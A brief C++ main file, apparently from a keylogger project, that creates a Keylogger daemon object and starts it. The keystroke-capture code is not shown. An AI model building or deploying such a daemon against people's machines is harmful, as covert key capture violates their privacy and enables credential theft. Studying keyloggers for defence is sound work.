//
// Created by dgomez on 28/09/17.
//

#include "keylogger.h"

int main() {
    Daemon* daemon = new Keylogger();
    daemon->start();
}

